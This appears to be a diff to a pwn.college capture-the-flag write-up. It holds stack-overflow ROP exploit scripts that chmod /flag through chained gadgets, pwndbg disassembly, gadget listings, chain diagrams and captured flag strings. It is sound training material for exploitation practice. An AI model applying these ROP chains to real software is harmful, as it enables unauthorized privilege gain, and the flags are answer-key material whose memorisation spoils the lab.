@@ -1912,15 +1912,15 @@ This is the ROP chain that we will be performing.
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd7804eba8 ╎  41 41 41 41 41 41 41 41  ╎ ( b"AAAAAAAAA" )
+            0x7ffd7804eba8 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd7804ec30 ╎  41 41 41 41 41 41 41 41  ╎ ( b"AAAAAAAAA" )
-                           ┌───────────────────────────┐
+            0x7ffd7804ec30 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec38 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rdi ; ret )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
@@ -1943,11 +1943,11 @@ rip --> challenge() return
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
@@ -1968,11 +1968,11 @@ rip --> pop rdi
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
@@ -1994,11 +1994,11 @@ rip --> ret
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
@@ -2018,11 +2018,11 @@ rip --> pop rsi
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
@@ -2041,11 +2041,11 @@ rip --> ret
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     rsp --> 0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
@@ -2062,12 +2062,12 @@ rip --> pop rax
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                           ┌───────────────────────────┐
-            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎ 
 
@@ -2082,10 +2082,7 @@ rip --> ret
 
 Stack:
                            ┌───────────────────────────┐
-            0x7ffd7804eba0 ╎  00 00 00 67 61 6c 66 2f  ╎ ( b"/flag\x00\x00\x00" )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
-                      .... ╎  .. .. .. .. .. .. .. ..  ╎ ....
+    rsp --> 0x7ffd7804ec70 │  .. .. .. .. .. .. .. ..  │
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎ 
 
@@ -2124,8 +2121,10 @@ leak_str = p.recvline().strip().decode().strip('.')
 buffer_addr = int(leak_str, 16)
 print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")
 
+flag_string = b"/flag\x00\x00\x00" 
+
 # Craft payload
-payload = b"/flag\x00\x00\x00" 
+payload = flag_string
 payload += b"A" * (const_offset - len(flag_string))
 payload += p64(pop_rdi_ret_gadget)
 payload += p64(buffer_addr)         
@@ -2137,17 +2136,37 @@ payload += p64(syscall_gadget)
 
 # Send the payload
 p.sendline(payload)
+p.interactive()
 ```
 
 ```
-hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ python ~/script.py
-[+] Starting local process '/challenge/stop-pop-and-rop-easy': pid 5948
-[*] Leaked Buffer Address: 0x7fffc49acb80
-[*] Stopped process '/challenge/stop-pop-and-rop-easy' (pid 5948)
+hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ python ~/script.py
+[+] Starting local process '/challenge/stop-pop-and-rop-easy': pid 2727
+[*] Leaked Buffer Address: 0x7fffe80e11f0
+[*] Switching to interactive mode
+
+[*] Process '/challenge/stop-pop-and-rop-easy' stopped with exit code -11 (SIGSEGV) (pid 2727)
+Received 209 bytes! This is potentially 7 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 8 gadgets of ROP chain at 0x7fffe80e1288.
+| 0x0000000000401e3e: pop rdi ; ret  ; 
+| 0x00007fffe80e11f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 41 41 41 41 41 41 41 41 
+| 0x0000000000401e36: pop rsi ; ret  ; 
+| 0x00000000000001ff: (UNMAPPED MEMORY)
+| 0x0000000000401e2e: pop rax ; ret  ; 
+| 0x000000000000005a: (UNMAPPED MEMORY)
+| 0x0000000000401e46: syscall  ; ret  ; 
+| 0x0000780ea44e260a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; or al, 8 ; 
+
+Leaving!
+[*] Got EOF while reading in interactive
+$ 
 ```
 
 ```
-hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ cat /flag 
+hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ cat /flag 
 pwn.college{AhCJW0hDJerngeygt7SEo49RF7a.01N0MDL4ITM0EzW}
 ```
 
@@ -2456,8 +2475,10 @@ leak_str = p.recvline().strip().decode().strip('.')
 buffer_addr = int(leak_str, 16)
 print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")
 
+flag_string = b"/flag\x00\x00\x00" 
+
 # Craft payload
-payload = b"/flag\x00\x00\x00" 
+payload = flag_string
 payload += b"A" * (const_offset - len(flag_string))
 payload += p64(pop_rdi_ret_gadget)
 payload += p64(buffer_addr)         
@@ -2469,13 +2490,19 @@ payload += p64(syscall_gadget)
 
 # Send payload
 p.sendline(payload)
+p.interactive()
 ```
 
 ```
-hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ python ~/script.py
-[+] Starting local process '/challenge/stop-pop-and-rop-hard': pid 3536
-[*] Leaked Buffer Address: 0x7ffc260dd110
-[*] Process '/challenge/stop-pop-and-rop-hard' stopped with exit code -11 (SIGSEGV) (pid 3536)
+hacker@return-oriented-programming~stop-pop-and-rop-hard:/$ python ~/script.py
+[+] Starting local process '/challenge/stop-pop-and-rop-hard': pid 543
+[*] Leaked Buffer Address: 0x7ffcb2ba18e0
+[*] Switching to interactive mode
+
+[*] Process '/challenge/stop-pop-and-rop-hard' stopped with exit code -11 (SIGSEGV) (pid 543)
+Leaving!
+[*] Got EOF while reading in interactive
+$  
 ```
 
 ```
@@ -2486,6 +2513,233 @@ pwn.college{sR9w4ikcelRl9slp_7YVUhCbJbD.0FO0MDL4ITM0EzW}
 &nbsp;
 
 ## Stop, Pop and ROP 2 (Easy)
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ /challenge/stop-pop-and-rop2-easy 
+###
+### Welcome to /challenge/stop-pop-and-rop2-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+```
+
+This time the challenge does not tell us the location of the buffer.
+Therefore, we cannot store our string at the beginning of the buffer and use it's address in out ROP chain.
+
+What we can do however, is resuse some string which is already present in the binary.
+
+Let's first understand the binary and get the following information:
+
+- [ ] Location of the buffer
+- [ ] Location of the stored return address to `main()`
+- [ ] Location of a NULL terminated string
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x00000000004010f0  putchar@plt
+0x0000000000401100  __errno_location@plt
+0x0000000000401110  puts@plt
+0x0000000000401120  cs_free@plt
+0x0000000000401130  printf@plt
+0x0000000000401140  read@plt
+0x0000000000401150  strcmp@plt
+0x0000000000401160  cs_disasm@plt
+0x0000000000401170  mincore@plt
+0x0000000000401180  setvbuf@plt
+0x0000000000401190  cs_open@plt
+0x00000000004011a0  cs_close@plt
+0x00000000004011b0  _start
+0x00000000004011e0  _dl_relocate_static_pie
+0x00000000004011f0  deregister_tm_clones
+0x0000000000401220  register_tm_clones
+0x0000000000401260  __do_global_dtors_aux
+0x0000000000401290  frame_dummy
+0x0000000000401296  DUMP_STACK
+0x0000000000401499  print_gadget
+0x000000000040168d  print_chain
+0x00000000004016fb  bin_padding
+0x0000000000401d94  free_gadgets
+0x0000000000401ddf  challenge
+0x0000000000401f00  main
+0x0000000000401fc0  __libc_csu_init
+0x0000000000402030  __libc_csu_fini
+0x0000000000402038  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000401ddf <+0>:     endbr64
+   0x0000000000401de3 <+4>:     push   rbp
+   0x0000000000401de4 <+5>:     mov    rbp,rsp
+   0x0000000000401de7 <+8>:     sub    rsp,0x60
+   0x0000000000401deb <+12>:    mov    DWORD PTR [rbp-0x44],edi
+   0x0000000000401dee <+15>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000401df2 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
+   0x0000000000401df6 <+23>:    lea    rdi,[rip+0x139b]        # 0x403198
+   0x0000000000401dfd <+30>:    call   0x401110 <puts@plt>
+   0x0000000000401e02 <+35>:    lea    rdi,[rip+0x1407]        # 0x403210
+   0x0000000000401e09 <+42>:    call   0x401110 <puts@plt>
+   0x0000000000401e0e <+47>:    mov    rax,rsp
+   0x0000000000401e11 <+50>:    mov    QWORD PTR [rip+0x32c8],rax        # 0x4050e0 <sp_>
+   0x0000000000401e18 <+57>:    mov    rax,rbp
+   0x0000000000401e1b <+60>:    mov    QWORD PTR [rip+0x329e],rax        # 0x4050c0 <bp_>
+   0x0000000000401e22 <+67>:    mov    rdx,QWORD PTR [rip+0x3297]        # 0x4050c0 <bp_>
+   0x0000000000401e29 <+74>:    mov    rax,QWORD PTR [rip+0x32b0]        # 0x4050e0 <sp_>
+   0x0000000000401e30 <+81>:    sub    rdx,rax
+   0x0000000000401e33 <+84>:    mov    rax,rdx
+   0x0000000000401e36 <+87>:    shr    rax,0x3
+   0x0000000000401e3a <+91>:    add    rax,0x2
+   0x0000000000401e3e <+95>:    mov    QWORD PTR [rip+0x328b],rax        # 0x4050d0 <sz_>
+   0x0000000000401e45 <+102>:   mov    rax,QWORD PTR [rip+0x3274]        # 0x4050c0 <bp_>
+   0x0000000000401e4c <+109>:   add    rax,0x8
+   0x0000000000401e50 <+113>:   mov    QWORD PTR [rip+0x3281],rax        # 0x4050d8 <rp_>
+   0x0000000000401e57 <+120>:   lea    rax,[rbp-0x40]
+   0x0000000000401e5b <+124>:   mov    edx,0x1000
+   0x0000000000401e60 <+129>:   mov    rsi,rax
+   0x0000000000401e63 <+132>:   mov    edi,0x0
+   0x0000000000401e68 <+137>:   call   0x401140 <read@plt>
+   0x0000000000401e6d <+142>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000401e70 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401e73 <+148>:   cdqe
+   0x0000000000401e75 <+150>:   lea    rcx,[rbp-0x40]
+   0x0000000000401e79 <+154>:   mov    rdx,QWORD PTR [rip+0x3258]        # 0x4050d8 <rp_>
+   0x0000000000401e80 <+161>:   sub    rcx,rdx
+   0x0000000000401e83 <+164>:   mov    rdx,rcx
+   0x0000000000401e86 <+167>:   add    rax,rdx
+   0x0000000000401e89 <+170>:   shr    rax,0x3
+   0x0000000000401e8d <+174>:   mov    rdx,rax
+   0x0000000000401e90 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401e93 <+180>:   mov    esi,eax
+   0x0000000000401e95 <+182>:   lea    rdi,[rip+0x13dc]        # 0x403278
+   0x0000000000401e9c <+189>:   mov    eax,0x0
+   0x0000000000401ea1 <+194>:   call   0x401130 <printf@plt>
+   0x0000000000401ea6 <+199>:   lea    rdi,[rip+0x1403]        # 0x4032b0
+   0x0000000000401ead <+206>:   call   0x401110 <puts@plt>
+   0x0000000000401eb2 <+211>:   lea    rdi,[rip+0x145f]        # 0x403318
+   0x0000000000401eb9 <+218>:   call   0x401110 <puts@plt>
+   0x0000000000401ebe <+223>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401ec1 <+226>:   cdqe
+   0x0000000000401ec3 <+228>:   lea    rcx,[rbp-0x40]
+   0x0000000000401ec7 <+232>:   mov    rdx,QWORD PTR [rip+0x320a]        # 0x4050d8 <rp_>
+   0x0000000000401ece <+239>:   sub    rcx,rdx
+   0x0000000000401ed1 <+242>:   mov    rdx,rcx
+   0x0000000000401ed4 <+245>:   add    rax,rdx
+   0x0000000000401ed7 <+248>:   shr    rax,0x3
+   0x0000000000401edb <+252>:   add    eax,0x1
+   0x0000000000401ede <+255>:   mov    edx,eax
+   0x0000000000401ee0 <+257>:   mov    rax,QWORD PTR [rip+0x31f1]        # 0x4050d8 <rp_>
+   0x0000000000401ee7 <+264>:   mov    esi,edx
+   0x0000000000401ee9 <+266>:   mov    rdi,rax
+   0x0000000000401eec <+269>:   call   0x40168d <print_chain>
+   0x0000000000401ef1 <+274>:   lea    rdi,[rip+0x1462]        # 0x40335a
+   0x0000000000401ef8 <+281>:   call   0x401110 <puts@plt>
+   0x0000000000401efd <+286>:   nop
+   0x0000000000401efe <+287>:   leave
+   0x0000000000401eff <+288>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at the address where `read@plt` is called.
+
+```
+pwndbg> break *(challenge+137)
+Breakpoint 1 at 0x401e68
+```
+
+```
+pwndbg> run
+Starting program: /challenge/stop-pop-and-rop2-easy 
+###
+### Welcome to /challenge/stop-pop-and-rop2-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+
+Breakpoint 1, 0x0000000000401e68 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+ RBX  0x401fc0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7bff6bb76297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+ R8   0x61
+ R9   0x32
+ R10  0x4005b3 ◂— 0x72616863747570 /* 'putchar' */
+ R11  0x246
+ R12  0x4011b0 (_start) ◂— endbr64 
+ R13  0x7ffd2b5e9d40 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd2b5e9c20 —▸ 0x7ffd2b5e9c50 ◂— 0
+ RSP  0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
+ RIP  0x401e68 (challenge+137) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
+ ► 0x401e68 <challenge+137>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+        nbytes: 0x1000
+ 
+   0x401e6d <challenge+142>    mov    dword ptr [rbp - 4], eax
+   0x401e70 <challenge+145>    mov    eax, dword ptr [rbp - 4]
+   0x401e73 <challenge+148>    cdqe   
+   0x401e75 <challenge+150>    lea    rcx, [rbp - 0x40]
+   0x401e79 <challenge+154>    mov    rdx, qword ptr [rip + 0x3258]     RDX, [rp_]
+   0x401e80 <challenge+161>    sub    rcx, rdx
+   0x401e83 <challenge+164>    mov    rdx, rcx
+   0x401e86 <challenge+167>    add    rax, rdx
+   0x401e89 <challenge+170>    shr    rax, 3
+   0x401e8d <challenge+174>    mov    rdx, rax
+─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
+01:0008│-058     0x7ffd2b5e9bc8 —▸ 0x7ffd2b5e9d58 —▸ 0x7ffd2b5eb683 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050     0x7ffd2b5e9bd0 —▸ 0x7ffd2b5e9d48 —▸ 0x7ffd2b5eb661 ◂— '/challenge/stop-pop-and-rop2-easy'
+03:0018│-048     0x7ffd2b5e9bd8 ◂— 0x16baf8e93
+04:0020│ rax rsi 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-038     0x7ffd2b5e9be8 ◂— 0xa /* '\n' */
+06:0030│-030     0x7ffd2b5e9bf0 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-028     0x7ffd2b5e9bf8 —▸ 0x7bff6baee302 (putchar+130) ◂— mov r8d, eax
+───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x401e68 challenge+137
+   1         0x401fa5 main+165
+   2   0x7bff6ba8c083 __libc_start_main+243
+   3         0x4011de _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7ffd2b5e9be0` 
+- [ ] Location of the stored return address to `main()`
+- [ ] Location of a NULL terminated string
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffd2b5e9c30:
+ rip = 0x401e68 in challenge; saved rip = 0x401fa5
+ called by frame at 0x7ffd2b5e9c60
+ Arglist at 0x7ffd2b5e9c20, args: 
+ Locals at 0x7ffd2b5e9c20, Previous frame's sp is 0x7ffd2b5e9c30
+ Saved registers:
+  rbp at 0x7ffd2b5e9c20, rip at 0x7ffd2b5e9c28
+```
+
+- [x] Location of the buffer: `0x7ffd2b5e9be0` 
+- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
+- [ ] Location of a NULL terminated string
+
+Now, let's look at the ROP gadgets that we have at our disposal.
 
 ```
 hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop2-easy 
@@ -2642,4 +2896,310 @@ Gadgets information
 0x0000000000401e7d : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
 
 Unique gadgets found: 149
+```
+
+A `chmod` would work, but we need to find a string that we can use as discussed earlier.
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-easy | grep -E "[0-9a-f]{2}00"
+ 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
+ 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
+ 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
+ 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
+ 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
+ 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
+ 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
+ 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
+ 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
+ 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
+ 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
+ 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
+ 403200 20746869 73207365 72696573 206f6600   this series of.
+ 403270 00000000 00000000 52656365 69766564  ........Received
+ 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
+ 403300 67657473 20617265 20657865 63757461  gets are executa
+ 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
+ 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
+ 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
+ 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
+ 403380 6f6f6462 79652100                    oodbye!.   
+```
+
+Out of the various options that we have, let's go with `b"!\x00"` which is at the address `0x403386`.
+
+- [x] Location of the buffer: `0x7ffd2b5e9be0` 
+- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
+- [x] Location of a NULL terminated string: `0x403386`
+
+### ROP chain
+
+This is the ROP chain that we will be performing.
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7ffd2b5e9be0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7ffd2b5e9c28 │  00 00 00 00 00 40 1d c8  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
